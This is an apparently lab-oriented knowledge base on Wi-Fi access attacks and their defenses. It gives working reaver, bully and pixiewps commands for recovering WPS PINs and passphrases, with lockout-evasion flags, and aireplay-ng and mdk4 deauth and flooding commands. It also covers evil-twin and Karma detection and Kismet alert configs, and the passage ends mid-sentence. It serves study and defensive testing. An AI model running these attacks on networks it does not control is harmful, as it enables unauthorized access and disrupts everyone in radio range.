# Theme: Access Attacks, Rogue-AP & MITM — Command-First Synthesis

> **Scope & authorization (read once, applies to the whole theme).** This is a knowledge base
> for a **local, allowlist-gated** Wi-Fi security lab: your own gear, a lab you own, a sanctioned
> CTF/competition range, or OSWP (PEN-210) study on networks you have **written permission** to
> test. Several primitives here (deauth, Karma/MANA, ARP/DNS spoof) are **transmitted into the
> air or onto a shared L2 segment** and hit every device in range — they are not scoped to one
> wire. "It looked quiet" is not authorization. Keep a BSSID/ESSID/MAC **allowlist** and gate
> every transmit behind it. Running any of this against networks you do not control is illegal
> (US CFAA, UK CMA, wiretap statutes, equivalents).
>
> **Defense-aware framing:** every attack below ships with its **defense** — that pairing is the
> deliverable, not an afterthought. **Rogue-AP / evil-twin is DETECTION + CONCEPT only.** The
> mechanics appear so the detector knows the signatures and so you can pass OSWP theory. This
> theme deliberately does **not** build a credential-phishing captive portal, an `--hostile-portal`
> harvester, or a keystroke-injection payload.
>
> **Rig assumed throughout:** Mac host → Kali (VM at `192.168.64.2`, or bare metal) → **TP-Link
> RTL8188EUS** adapter (**2.4 GHz only**) for monitor/injection/AP work, plus the Mac GPU for
> hashcat (separate handshake/PMKID module). Because the adapter is 2.4 GHz-only: every WPS target
> you can reach is 2.4 GHz (never pass `-5`/`--5ghz`), and you are **blind to 5/6 GHz** twins/clients
> — note the band in every report and plan a dual-band card for full coverage.

---

## 0. Theme map & where to start

| Phase | Section | Primitive | Band limit |
|---|---|---|---|
| **Get on the network** | §2 WPS | Offline PIN (Pixie) → default/NULL PIN → online brute → PIN→PSK | 2.4 GHz WPS |
| **Force a reconnect / disrupt** | §3 Deauth & DoS | Forge mgmt frames; `aireplay`/`mdk4`; bounded by 802.11w/PMF | 2.4 GHz |
| **Impersonate an AP** | §4 Rogue-AP | Evil-twin, Karma/MANA, known-beacon — **detect & defend only** | detect 2.4 GHz |
| **Own the path after access** | §5 MITM | bettercap ARP/DNS/sniff; sslstrip reality check | managed-mode LAN |

**One-line pro order for "get in" (fastest → slowest):** `wash` recon → **Pixie-Dust** (offline,
no lockout) → default/derived PIN (1 try) → NULL PIN → online PIN brute (hours) → if WPS is dead,
pivot to WPA handshake/PMKID + hashcat (separate module). Deauth (§3) is the *forcing* tool for
that handshake pivot.

---

## 1. Shared radio prep (every session starts here)

```bash
# 0. Identify the adapter + driver that claimed it
iw dev                                   # interface name, e.g. wlan0 / wlan1
sudo airmon-ng                           # lists iface + driver/chipset
lsusb | grep -i realtek
iw list | grep -A10 "Supported interface modes"   # must show 'monitor' (and 'AP' for §4)

# 1. Kill daemons that grab the radio (NetworkManager / wpa_supplicant / dhclient)
sudo airmon-ng check kill

# 2a. Monitor mode via airmon-ng (creates wlan0mon; can lock a channel at start)
sudo airmon-ng start wlan0 6             # -> wlan0mon, locked to ch 6

# 2b. Driver-agnostic raw method (cleaner / more predictable on Realtek)
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
sudo iw dev wlan0 set channel 6
iw dev                                   # confirm type monitor + channel

# 3. Prove injection BEFORE trusting any "negative" result
sudo aireplay-ng --test wlan0mon         # or: aireplay-ng -9 wlan0mon  -> "Injection is working!"

# 4. Kill power-save (silently drops captured frames)
sudo iw dev wlan0mon set power_save off
```

- Throughout: `$IFACE` = monitor iface (`wlan0mon` or `wlan0`), `$BSSID` = target MAC, `$CH` = channel.
- **RTL8188EUS driver:** prefer the out-of-tree `aircrack-ng/rtl8188eus` (or `morrownr/8188eu`) **DKMS**
  build for reliable monitor+injection; the in-kernel `r8188eu`/`rtl8xxxu` is hit-or-miss. If you must
  build it, blacklist the in-kernel module (`echo 'blacklist r8188eu' | sudo tee -a /etc/modprobe.d/realtek.conf`), build, reboot.
- **Monitor mode dies silently after driver/kernel updates.** Re-verify (`iw dev` + injection test) at the
  start of **every** session — a "clean" survey on a dead monitor iface is a false negative.
- **Interface-name drift:** airmon gives `wlan0mon`; raw `iw` keeps `wlan0`. Use whatever `iw dev` shows, or tools error on open.

---

## 2. WPS Access Attacks (reaver · bully · pixiewps)

WPS lets a client join WPA/WPA2 with an **8-digit PIN** instead of the passphrase. **Recovering the
PIN yields the WPA-PSK = full network access.** Three independent flaws:

1. **Split-half + checksum (Viehböck 2011).** The AP validates the PIN in two halves and signals
   when the **first half** is right before the second is sent; the 8th digit is a checksum of the
   first 7. Keyspace collapses from 10⁸ to **10⁴ + 10³ ≈ 11,000** online tries (avg ~5,500).
   Checksum (hostap `wps_pin_checksum`): weighted sum, odd positions ×3, then `(10 - (sum%10)) % 10`.
2. **Pixie-Dust / offline recovery (Bongard 2014).** In **M3** the AP sends `E-Hash1`/`E-Hash2`
   masked by two secret nonces `E-S1`/`E-S2`. On weak/zero-PRNG chipsets those nonces are
   predictable (or literally `0`), so the PIN is brute-forced **offline from one M1–M3 exchange**
   — seconds to minutes, **no lockout, no rate limit**.
3. **Default / derived PINs.** Many vendors derive the factory PIN from the **BSSID** (or WAN
   MAC / serial). Know the algorithm for the model → 1-PIN attempt.

> **Still live in 2025:** a NetRise study of 24 current consumer/SOHO devices (6 vendors) found
> **20/24 still Pixie-vulnerable**; the 4 fixes took ~9 years. UIs often "disable"/hide WPS while
> firmware stays exploitable ("silent exploit paths"). Not a museum piece — **measure, don't assume.**

### 2.1 Decision order (what a pro tries, fastest → slowest)

```
1. wash scan        -> WPS APs; note WPS ver, Lck (locked?), vendor/chipset guess, dBm
2. Pixie-Dust (-K)  -> seconds IF weak-nonce chipset; offline, NO lockout risk  *** try first ***
3. Default/derived PIN -> compute from BSSID (ComputePIN/EasyBox/etc.), try 1 PIN
4. Known-PIN list   -> vendor default DB (reaver -W, wifite ship these)
5. NULL PIN         -> some APs accept empty PIN (reaver -p '')
6. Online PIN brute -> reaver/bully full ~11k keyspace; HOURS; triggers lockout -> tune timing
7. Not WPS-vulnerable -> leave WPS, pivot to WPA handshake / PMKID + hashcat (separate module)
```

`wifite` automates steps 2→6. **Fingerprint before you transmit:** the beacon/probe WPS IE carries
vendor/model/OUI — guess the chipset (and thus likely mode / instant-win odds) from a **passive**
scan before sending a single frame.

### 2.2 Recon — find WPS APs (passive)

```bash
sudo wash -i $IFACE                      # survey; columns: BSSID|Ch|dBm|WPS ver|Lck|Vendor|ESSID
sudo wash -i $IFACE -c 6                  # lock one channel (fewer missed packets)
sudo wash -i $IFACE -j                    # extended WPS info as JSON (scriptable -> allowlist)
sudo wash -i $IFACE -a                    # include non-WPS APs
sudo airodump-ng --wps $IFACE             # alternative; surfaces the WPS column too
```

- **`Lck=No`** → open to attempt. **`Lck=Yes`** → online brute stalls; **Pixie can still fire** (offline).
- Record **BSSID + channel**. Signal matters: aim **≥ −70 dBm** (ideally ≳ −60); weak signal = timeouts, NACKs, false lockouts, corrupt M1–M3.
- Flag drift across builds — confirm with `wash -h` / `reaver -h` / `bully -h` / `man pixiewps` on *your* install.

### 2.3 Pixie-Dust — try this first (offline, no lockout)

**Driven by reaver (recommended — captures M1–M3 and auto-calls pixiewps):**

```bash
sudo reaver -i $IFACE -b $BSSID -c $CH -K 1 -N -vv
#   -K 1 (== -Z / --pixie-dust): run Pixie-Dust
#   -c    : lock channel (implies -f, disables hop -> stabler capture)
#   -N    : don't send NACKs on out-of-order pkts (cleaner exchange on many APs)
#   -L    : (add) ignore AP 'locked' state and keep trying
#   -vv   : shows the live WPS exchange + the exact values handed to pixiewps
```

Success looks like:

```
[P] E-Nonce / PKE / PKR / E-Hash1 / E-Hash2 / AuthKey: ...
[+] WPS PIN: '04847533'
[+] WPA PSK: 'correct horse battery staple'
[+] AP SSID: 'LabNet'
```

**Standalone pixiewps** (when you captured values another way, or to force a mode / widen a Realtek
time window / re-run without touching the air). Modified reaver/bully (reaver-wps-fork-t6x) print every field:

```bash
pixiewps --pke <PKE> --pkr <PKR> \
         --e-hash1 <E-Hash1> --e-hash2 <E-Hash2> \
         --authkey <AuthKey> --e-nonce <E-Nonce>
# short form: pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce>

# Realtek (mode 3): time-seeded PRNG -> give a date window, use all cores:
pixiewps --pke <..> --pkr <..> --e-nonce <..> --r-nonce <..> --e-bssid <BSSID> \
         --mode 3 --start 01/2019 --end 01/2026 -j 0
#   -f / --force : sweep full 1970..2038 (slow, last resort)

# Passive full-capture WPA-PSK recovery (M1-M7, mode-3 devices, pixiewps >= 1.4):
pixiewps --pke <..> --pkr <..> --e-nonce <..> --r-nonce <..> --e-bssid <BSSID> \
         -7 <enc-settings-M7> --mode 3            # add -5 <M5> for secret nonce 1; -s/-z for the PIN
```

**Chipset ⇄ `--mode` decision map** (pixiewps auto-selects; knowing it predicts an instant win):

| `--mode` | Internal | Vendors / chips | How `E-S1/E-S2` leak | Speed |
|---|---|---|---|---|
| **1** | RT/MT/CL | **Ralink, MediaTek, Celeno** (+ OEM rebrands) | `E-S1=E-S2=0` (never generated) | **Instant**, ~ms — classic Pixie kill |
| **2** | eCos simple | **Broadcom** (eCos RTOS) | weak PRNG, state recoverable from `E-Nonce` | Fast (some need mode-3 PSK trick) |
| **3** | RTL819x | **Realtek** (RTL8xxx) | PRNG **time-seeded**; same gen as `E-Nonce` | Needs time window; **never use `-S`** |
| **4/5** | eCos simplest/Knuth | some eCos/Broadcom | experimental | only if explicitly selected |

- **Realtek (mode 3):** if the whole M1–M3 lands in one PRNG tick, `E-S1=E-S2=E-Nonce` → instant win on a clean, single-session capture with a correct system clock. Time-sensitive.
- **Atheros / Qualcomm:** generally **not** Pixie-vulnerable (proper RNG). Don't burn time — go to default/online PIN or pivot.
- Build pixiewps with OpenSSL (`make OPENSSL=1`) for faster SHA-256 on big mode-3/`-f` sweeps.

### 2.4 Default / derived PIN, and NULL PIN (single-attempt shots)

```bash
# Specific derived/known PIN:
sudo reaver -i $IFACE -b $BSSID -c $CH -p 12345670 -vv

# reaver built-in default-PIN generators (vendor-specific):
sudo reaver -i $IFACE -b $BSSID -c $CH -W1 -vv       # 1=Belkin  2=D-Link  3=Zyxel

# NULL PIN (separate bug from Pixie; bully does NOT support it — use reaver):
sudo reaver -i $IFACE -b $BSSID -c $CH -f -N -g 1 -vv -p ''
```

Known default-PIN families (public research, for gear you own/are cleared to test): **ComputePIN**
(last 3 BSSID octets, D-Link & others); **Vodafone/Arcor EasyBox 802/803** (PIN from MAC+serial, serial
itself derivable from MAC — SEC Consult 2013); **D-Link** (BSSID, some from WAN MAC → try BSSID ±1/±2
on last octet); **TRENDnet TEW-818RDU** (static PIN from 2.4 GHz BSSID, shared across radios). Derive
locally from published algorithms — online per-BSSID PIN DBs (3WiFi-style) are out of scope and legally fraught.

### 2.5 Online PIN brute (the slow fallback)

```bash
# Baseline:
sudo reaver -i $IFACE -b $BSSID -c $CH -vv

# Hardened/robust starting flags (tune to the AP, not a template):
sudo reaver -i $IFACE -b $BSSID -c $CH -vv \
  -N \        # no NACKs (more stable)
  -L \        # ignore AP locked state
  -d 15 \     # 15s between PIN attempts (evade lockout/rate-limit)
  -T 2 \      # M5/M7 timeout 2s for slow/laggy APs (default 0.4)
  -r 3:60 \   # sleep 60s every 3 attempts
  -x 60 \     # sleep 60s after 10 unexpected failures
  -S          # small DH = faster -- OMIT on Realtek/Pixie
```

Key reaver flags: `-e` ESSID (hidden nets), `-p` try PIN (`''`=null), `-g` max-attempts, `-l` lock-delay
(default 60), `-A` no-associate (pair with external `aireplay-ng -1`), `-E` EAP-terminate (flaky APs),
`-J` timeout-is-NACK (DIR-300/320), `-w` win7-registrar mimic, `-m` spoof MAC, `-s` restore session,
`-o` logfile, `-C` run-on-success. **Session resume:** reaver auto-saves to `/etc/reaver/<BSSID>.wpc`
(or `/var/lib/reaver`); Ctrl-C and re-run the same command, or `-s <file>`, to resume **mid-keyspace** —
essential for the hours-long run.

**Bully — alternate EAP state machine (try when reaver stalls, and vice-versa):**

```bash
# Online brute (iface is POSITIONAL in bully):
sudo bully $IFACE -b $BSSID -c $CH -S -F -B -v 3
# Pixie-Dust with bully:
sudo bully $IFACE -b $BSSID -c $CH -d -v 3
#   -d pixie  -B brute-the-checksum-digit  -S sequential  -F force  -L lockignore  -T testmode
```

Reaver and bully implement different association/EAP state machines → one often completes M1–M3 where the
other loops on timeouts. Keep both installed; `wifite --bully` / `--reaver` switches engines.

### 2.6 PIN → PSK, and one-shot automation

```bash
# Pixie/brute gave the PIN but not the PSK? Replay the known PIN (M4..M8) to dump the passphrase:
sudo reaver -i $IFACE -b $BSSID -c $CH -p 04847533 -vv       # prints [+] WPA PSK: '...'

# wifite runs the whole order across many APs:
sudo wifite -i wlan0 --wps --pixie --kill
#   --wps : only WPS APs   --pixie : run Pixie   --bully/--reaver : pick engine
#   --ignore-locks : keep going past WPS LOCKED   --kill : airmon-ng check kill first
# Default per-target order: WPS Pixie -> WPS NULL PIN -> WPS PIN brute -> PMKID -> WPA handshake.
# Cracked keys saved to cracked.json/cracked.txt. Ctrl-C skips current attack (c continue / e exit).
```

### 2.7 WPS gotchas

- **Pixie prints PIN but no PSK** — expected on some builds; it's two phases. Re-run `reaver -p <pin>` (§2.6).
- **Realtek + `-S` (small-DH) = broken Pixie.** Never combine; `-S/--dh-small` is deprecated generally. `-S` is fine (and faster) only for online brute on **non**-Realtek.
- **Realtek time sensitivity.** Stale capture / wrong clock / wrong `--start/--end` window → no crack even on a vulnerable AP. Capture fresh, set a sane window, `-f` as last resort.
- **WPS LOCKED** stops *online* brute only; it does **not** stop Pixie. A locked AP may still refuse the one exchange — try once, wait `--lock-delay`, or `-L/--ignore-locks`; don't hammer.
- **Dirty capture = garbage hashes.** Weak signal, channel hop, interference corrupt M1–M3. Lock `-c`, get closer, `-N`, retry; `-vv` to confirm `E-Hash1/E-Hash2/AuthKey` actually populated before blaming the chipset.
- **Checksum-evasion APs** reject the computed checksum → bully `-B` brutes that digit too.
- **Injection flakiness on RTL8188EUS** → reaver "Failed to associate" loops. Fix the driver (§1) before blaming the target.
- **"Patched" that isn't** — a UI toggle may hide WPS while firmware keeps answering. Re-verify with `wash` (§2.8).

### 2.8 DEFENSE — WPS

- **Disable WPS entirely** — the **only complete fix** for all three attack classes. Do it in firmware, not just the LED/button.
- **Verify it actually took:** re-scan your own AP — `sudo wash -i $IFACE` must show the BSSID **absent** from the WPS list. Firmware UIs lie (NetRise 2025: UI hid WPS, stack stayed exploitable).
- **Patch firmware** for proper nonce randomization (the only real Pixie fix). No patch → **OpenWrt** on supported hardware or **retire** the device. For broken chipsets (Ralink `E-S=0`, Realtek time-seed) firmware/hardware change is the only fix.
- **Lockout/rate-limiting is NOT a Pixie defense** — it slows online brute only; Pixie is offline/one-exchange, and a correct default PIN is one try. Don't rely on it.
- **Detection (concept):** a single Pixie exchange is indistinguishable from a legit client associating, so the dependable control is a **config/firmware audit** (is WPS off, *really* off). Watchable weak signals: bursts of EAP-WSC M1–M3 from a non-provisioning client, repeated registrar associations, WPS activity from a MAC that never completes M8 — treat as "someone is probing WPS," not proof of a crack. Posture: WPA2-AES/**WPA3**, long random passphrase, WPS off and verified, EOL gear replaced.

---

## 3. Deauth & 802.11 DoS — the forced-reauth primitive

On WPA2-Personal **without 802.11w**, management frames (deauth, disassoc, auth, beacon, probe) are
**unauthenticated and unencrypted** — any radio in range can forge them. A spoofed **deauth** (AP→client
or client→AP) tears down the association; the client must redo the 4-way handshake. This is a **two-for-one**
primitive: a **DoS** (keep sending) *and* the standard way to **force a 4-way handshake** for offline
WPA cracking (capture half lives in the handshake module). **Disassociation** is the sibling frame, same
effect. `mdk4` covers the wider DoS surface (auth/beacon/EAPOL/TKIP floods).

### 3.1 Decision order

```
0. Target on ALLOWLIST? Are you owner / written scope? (deauth hits every client in RF range)
1. Monitor up, daemons killed, LOCKED to the AP channel (§1).
2. Recon: BSSID, channel, and associated CLIENT MACs (airodump-ng). Read RSN MFP.
3. Goal = HANDSHAKE or pure DoS?
     Handshake -> start airodump capture, THEN a SHORT targeted deauth (-0 3..10), stop on "WPA handshake".
     Pure DoS  -> continuous targeted/broadcast deauth, or escalate to mdk4.
4. Prefer TARGETED (-c <client>) over broadcast -- many modern clients ignore broadcast deauth.
5. No clients associated? Deauth has nothing to force -> pivot to clientless PMKID (hcxdumptool).
6. Deauth does nothing? -> check PMF (802.11w). If PMF required, classic deauth fails BY DESIGN;
   record "mitigated by 802.11w", test the flooding edge-case only as a documented experiment, pivot to PMKID.
7. Pair every finding with the DEFENSE (§3.5). That is the deliverable.
```

### 3.2 Recon

```bash
sudo airodump-ng wlan0mon                                  # survey; note BSSID + CH
sudo airodump-ng -c 6 --bssid $BSSID -w /root/lab/hs wlan0mon   # lock + filter + WRITE capture
```

- **Top pane = APs:** `ENC/CIPHER/AUTH` (WPA2 vs WPA3/SAE), **`MFP`/RSN capability** (PMF?), `PWR` (closer to 0 = stronger). AUTH `SAE` = WPA3 (PMF mandatory → plan for §3.4).
- **Bottom pane = STATIONs:** a `STATION` MAC associated to your BSSID is the ideal `-c` target. `(not associated)` clients can't be deauthed off that AP.
- Keep airodump running while you deauth — the top-right **`WPA handshake: <BSSID>`** banner is your capture success signal.

### 3.3 aireplay-ng `--deauth` (core primitive) + mdk4 (DoS multitool)

```bash
# TARGETED deauth (preferred): kick ONE client. -0 N = number of BURSTS; 0 = continuous.
sudo aireplay-ng -0 5 -a $BSSID -c 11:22:33:44:55:66 wlan0mon
# Continuous targeted DoS:
sudo aireplay-ng -0 0 -a $BSSID -c 11:22:33:44:55:66 wlan0mon
# BROADCAST deauth (all clients; many ignore it -- sweep only, then follow up targeted):
sudo aireplay-ng -0 5 -a $BSSID wlan0mon
# SHORT burst for handshake capture (do NOT flood -- you only need one reconnect):
sudo aireplay-ng -0 3 -a $BSSID -c 11:22:33:44:55:66 wlan0mon
```

aireplay flags: `-a` AP MAC, `-c` client MAC (omit → broadcast), `-h` spoofed source MAC, `-D` disable
AP-detection (skip "waiting for beacon" once channel-locked), `-x <pps>` rate cap, `-Z <rc>`/`--deauth-rc`
reason code (default 7; **cosmetic** for the DoS — Lounis et al. found codes 0–254 equivalent; change it
only to dodge naive signature WIDS), `--ignore-negative-one` (for drivers that read channel as −1).

Mechanics: a **directed** (`-c`) deauth sends **128 frames per count** (64 to AP spoofed-from-client +
64 to client spoofed-from-AP), so `-0 1 -c` is 128 frames. The **ACK** column `[61|63 ACKs]` = ACKs heard
from (client|AP); **ACK≈0 means you failed** (too far / wrong channel / PHY mismatch), not that the target is immune.

```bash
# mdk4 shape: mdk4 <iface> <mode> [opts]   (mdk4 --fullhelp ; mdk4 --help <mode>)
sudo mdk4 wlan0mon d -B $BSSID -E "TargetSSID" -s 200 -w whitelist.txt   # deauth, throttled, protect own kit
sudo mdk4 wlan0mon a -a $BSSID -m                 # Auth DoS (fake clients; can freeze weak APs)
sudo mdk4 wlan0mon b -s 200 -c 6 -m               # Beacon flood: 200 fake APs/s on ch6
sudo mdk4 wlan0mon m -t $BSSID                     # Michael/TKIP shutdown (~60s) -- TKIP-only, legacy
sudo mdk4 wlan0mon e -t $BSSID                     # EAPOL logoff flood (kick 802.1X clients)
```

mdk4 modes: `d` deauth/disassoc, `a` auth DoS, `b` beacon flood, `p` SSID probe/decloak, `m` Michael/TKIP,
`e` EAPOL start/logoff, `s` 802.11s mesh, `w` WIDS confusion, `f` fuzzer, `x` protocol PoC. Mode-`d` opts:
`-w` **whitelist** (MACs to *ignore* — **set this in shared air to protect your own kit**), `-b` blacklist,
`-B` one BSSID, `-E` ESSID, `-S` one station, `-c` channel(s) (`-c h` hops all 14), `-s` pps (default
unlimited — **throttle in a lab**), `-x` IDS stealth. Evasion modifiers: `--ghost <period>,<max_rate>,<min_txpower>`, `--frag <...>`.

**Targeted vs broadcast rule:** targeted (`-c` / mdk4 `-S`) is acknowledged and works on clients that drop
broadcast (most modern phones/laptops) — the default pro choice. Broadcast is a cheap sweep when you can't
enumerate clients. **For a handshake, less is more** (`-0 3`, stop on banner): continuous flooding can
*prevent* the 4-way from completing. No client associated → skip deauth, go clientless PMKID.

### 3.4 802.11w / PMF — the hard bound on this whole technique

PMF (Protected Management Frames) signs deauth/disassoc with the session key, so **forged deauths are
cryptographically rejected.** Document this first — read the AP's RSN `MFP` before keying up.

- **WPA3-Personal (SAE)** → PMF **mandatory**; classic deauth **does not disconnect** a compliant client (expect ACK=0).
- **WPA2 with PMF required (MFPR)** → same; classic deauth fails.
- **WPA2 PMF capable/optional (MFPC)** or **WPA3-transition mode** → the weak spot: WPA2-era clients still accept unprotected deauth even on a "WPA3" SSID. Most "WPA3" deployments are effectively attackable here.
- **PMF-enabled edge cases (implementation-dependent):** flooding *malformed/invalid* deauth has disconnected fully-patched Android in ~9 s (KTO PoC) by overwhelming the client, not breaking crypto; protected-frame processing/replay bugs (Schepers/Ranganathan/Vanhoef 2022); spoofed-PMKID / malformed RSN-tag coaxing a protected deauth (hostap suite; IGTK issue patched as **CVE-2023-21061**, Android Mar 2023).
- **Unaffected by PMF:** auth flood (`mdk4 a`), beacon flood (`mdk4 b`), RF jamming — they operate before/around the protected association.

**Lab takeaway:** PMF required → record "deauth mitigated by 802.11w" as the *result*, pivot to PMKID.

### 3.5 DEFENSE — deauth/DoS

1. **Enable 802.11w / PMF** — set **required** where the client fleet allows; this is the #1 control and neutralizes classic deauth.
2. **Move to WPA3-SAE** (PMF mandatory). Avoid long-lived **WPA3-transition mode** — it reopens the WPA2 PMF-optional hole; disable it once legacy clients retire.
3. **WIDS/WIPS** alerting on mgmt-frame anomalies — deauth/disassoc flood rate per source/BSSID, Kismet `DEAUTHFLOOD`/`BCASTDISCON`, beacon/auth-flood signatures. A deauth flood often **precedes an evil-twin** — correlate (flood then a new BSSID with your ESSID).
4. **Detect cheaply yourself:**
   ```bash
   tshark -i wlan0mon -Y "wlan.fc.type_subtype==0x0c || wlan.fc.type_subtype==0x0a" \
          -T fields -e wlan.sa -e wlan.da -e wlan.fixed.reason_code
   # Burst of subtype-12 (deauth) w/ reason 7 from your BSSID = classic deauth attack.
   ```
5. **Patch AP *and* client firmware** — the PMF flooding/replay bypasses are implementation bugs (e.g. CVE-2023-21061 fix).
6. **Ineffective controls to record as such:** MAC filtering (spoofable), SSID hiding (decloaked by `mdk4 p`), VPN (L3 — does nothing against L2 deauth).
7. **Physical/RF:** wired for critical endpoints; reduce external RF exposure — the only hard stop for a flood an attacker can physically reach.

---

## 4. Rogue-AP: Evil-Twin & Karma/MANA — DETECTION + CONCEPT ONLY

> The mechanics below exist so the **detector** knows the signatures and so you can pass OSWP theory.
> This section builds **no** rogue AP, captive portal, or credential harvester. If an authorized
> red-team ever needs a live twin, that is a separate, scoped, signed-off activity.

### 4.1 Concepts (so you know the signatures)

**Evil twin** = a rogue AP impersonating a real network by copying its **ESSID** (and usually BSSID,
channel, advertised security). Clients won't roam to a weaker copy on their own, so the attacker floods
**deauth/disassoc** (§3) to peel them off → re-associate to the rogue. **Key insight:** ESSID+BSSID match
is *not* proof of legitimacy — a competent attacker clones the BSSID too. The durable discriminators are
**physical-layer**: signal strength / TX values, beacon timing, BSS timestamp sequence.

**Karma (2004)** — devices probe "is `NETWORK_X` here?"; a Karma AP answers *yes* to any name, so the
device auto-associates. Karma answers only **directed** probes and **only works on open networks** (no key
to prove).

**MANA (2014, SensePost)** — modern OSes lean on **broadcast** probes + passive scanning. MANA reconstructs
each device's **Preferred Network List (PNL)** from the directed probes it *does* emit, then answers a
broadcast probe with a directed response for **every** network in that device's PNL. Clients accept **one
BSSID advertising many ESSIDs** — which is exactly the #1 detection signal. Modes: **quiet/per-device**
(answer each device only with the networks it probed — low collateral), **loud** (global union PNL answered
to everyone — catches passive devices, huge collateral), **known-beacon** (no PNL info → beacon a wordlist of
common SSIDs; any device whose PNL contains one auto-joins).

**Enterprise (802.1X/EAP) evil twin — concept + defense only.** Against WPA2-Enterprise the rogue needs the
client to *speak EAP to it*. If the supplicant **doesn't validate the RADIUS server certificate**, it runs
PEAP/TTLS against the attacker's RADIUS and leaks an **MSCHAPv2 challenge/response** (crackable with
asleap/hashcat) or a cleartext inner credential (EAP-GTC/TTLS-PAP). **Every step is defeated by client-side
server-certificate validation** — that is the whole ballgame, and the deliverable here. (KB stops at the
concept; no portal walkthrough.)

**Tooling that produces these signatures** (recognize them): `mdk4`/`mdk3` (deauth/beacon floods),
`hostapd-mana`, `eaphammer`, `airbase-ng -P`, `wifiphisher`, `airgeddon`, WiFi Pineapple, Pwnagotchi, ESP32
Marauder, Flipper Evil Portal. Default fingerprints to flag: eaphammer/Pineapple BSSIDs `00:11:22:33:44:00` /
`00:11:22:33:44:55`, default ESSID `eaphammer`; Karma/Pineapple OUI `00:13:37` (Kismet `KARMAOUI`).

### 4.2 Detection decision order

```
1. BASELINE FIRST. Build allowlist of ESSID -> {BSSID, channel, enc/cipher/auth, PMF} for every AP you own.
2. Passive survey (airodump, both bands if you have a dual-band card). Flag: your ESSID from an unknown
   BSSID; a known BSSID on a new channel / weaker crypto / open where it should be WPA2/3.
3. Signal/TX anomaly: same BSSID showing two signal tracks or an implausible RSSI jump = two transmitters.
4. Deauth-storm watch: twins ride a deauth flood to herd clients (wlan.fc.type_subtype==0x0c).
5. Karma/MANA tell: ONE BSSID answering probe responses for MANY different ESSIDs (and/or answering
   probes for random non-existent SSIDs).
6. Promote to a standing WIDS (Kismet / nzyme) so detection is continuous.
7. Harden so the attack fails even if present (§4.6).
```

### 4.3 Passive survey + allowlist diff

```bash
# Wide survey to CSV + pcap (5 GHz only if the adapter supports it)
sudo airodump-ng --band abg -w survey --output-format csv,pcap --write-interval 1 wlan0mon
# Filter to your network name; several BSSIDs under one ESSID = investigate (-N by ESSID, -R regex)
sudo airodump-ng --band abg -N "YourCorpSSID" wlan0mon

# Evil-twin diff: your ESSID from a BSSID NOT on the allowlist (allowlist.txt = one BSSID/line)
awk -F',' 'NR>1 && $14 ~ /YourCorpSSID/ {gsub(/ /,"",$1); print $1}' survey-01.csv \
  | sort -u | comm -23 - <(sort -u allowlist.txt)
#   ^ anything printed = an ESSID match from an unknown BSSID -> candidate evil twin
```

**Config-drift → meaning → Kismet alert:**

| Observation | Meaning | Kismet alert |
|---|---|---|
| Your ESSID, unknown BSSID | Classic evil-twin candidate | `APSPOOF` |
| Known BSSID, new channel | Spoof / CSA abuse | `CHANCHANGE`, `DOT11CSASPOOF` |
| Your ESSID now **open** / weaker cipher | Downgrade to ease capture | `CRYPTODROP`, `ADVCRYPTCHANGE` |
| Beacon rate changed | Attacker software fingerprint | `BEACONRATE` |
| BSS timestamp out of sequence | Two radios claiming one BSSID | `BSSTIMESTAMP` |
| Probe-resp channel ≠ beacon channel | Spoofed response | `PROBECHAN` |

### 4.4 Signal/TX anomaly, deauth-storm & Karma detection

```bash
# Lock on a suspect BSSID and trend PWR/beacons; a 2nd concurrent signal track for one BSSID = two TX
sudo airodump-ng --bssid $BSSID -c $CH -w sig --output-format csv wlan0mon

# Deauth/disassoc storm (live feed, and a 10s-window rate alarm)
sudo tshark -i wlan0mon -Y '(wlan.fc.type_subtype==0x0c || wlan.fc.type_subtype==0x0a)' \
  -T fields -e frame.time -e wlan.sa -e wlan.da -e wlan.fc.type_subtype
sudo tshark -i wlan0mon -q -z io,stat,10,'COUNT(frame)wlan.fc.type_subtype==0x0c'

# Karma/MANA: one SA (BSSID) paired with MANY SSIDs in probe responses == suspicious
sudo tshark -i mon0 -Y 'wlan.fc.type_subtype==0x05' \
  -T fields -e wlan.sa -e wlan.ssid | sort | uniq -c | sort -rn
# Active DIY Karma detector: emit directed probes for random non-existent SSIDs; a legit AP ignores
# them, a Karma/MANA AP answers. (subtype 0x04 = Probe Request, 0x05 = Probe Response.)
```

**Wireshark filters:** deauth `wlan.fc.type_subtype==0x0c`; disassoc `0x0a`; beacons `0x08`; probe req `0x04`;
probe resp `0x05`; reason code `wlan.fixed.reason_code`. **Rule of thumb:** >~20 broadcast deauths in 60 s,
or hundreds–thousands/min on a normally-quiet net, is a storm — **baseline your own quiet rate first** (a
handful of deauths is normal). RSSI is noisy (multipath) — use it to *flag*, not convict; keep the sensor stationary.

### 4.5 Standing WIDS — Kismet & nzyme

```bash
sudo kismet -c wlan0mon          # or add the source in the web UI (:2501)
```

`kismet_site.conf` (override location — do **not** edit `kismet_alerts.conf`):

```conf
# Evil-twin: valid MACs for your SSID (exact, regex, or OUI-masked)
apspoof=Corp1:ssid="YourCorpSSID",validmacs="00:11:22:33:44:55,AA:BB:CC:DD:EE:FF"
packets_dedup_size=0        # de-dup can hide flood/spoof frames from APSPOOF/DEAUTHFLOOD -- disable for detection
# Rate limits: alert=NAME,<max>/min,<max>/sec  (0/min,0/sec disables)
alert=APSPOOF,5/min,1/sec
alert=DEAUTHFLOOD,5/min,1/sec
alert=BCASTDISCON,5/min,1/sec
alert=CHANCHANGE,5/min,1/sec
alert=CRYPTODROP,5/min,1/sec
alert=ADVCRYPTCHANGE,5/min,1/sec
alert=BSSTIMESTAMP,5/min,1/sec
alert=KARMAOUI,5/min,1/sec
```

Kismet evil-twin alerts: `APSPOOF`, `ADVCRYPTCHANGE`/`CRYPTODROP`, `CHANCHANGE`, `BEACONRATE`, `BSSTIMESTAMP`,
`PROBECHAN`, `KARMAOUI`, `DEAUTHFLOOD`/`BCASTDISCON`, `DISCONCODEINVALID`, `NOCLIENTMFP` (client without PMF
on an MFP-capable net = your hardening gap). A **non-beaconing Karma AP won't show in a normal scan** — you
need the IDS view. **nzyme** (sensor-based): approves-known/alerts-on-rest inventory, **air-vs-wire
correlation** (separates real intrusions from neighbors), AP **RF fingerprinting** + impossible-location,
expected BSSID/channel/security diff, **signal-track** detection, look-alike SSIDs, attack-platform
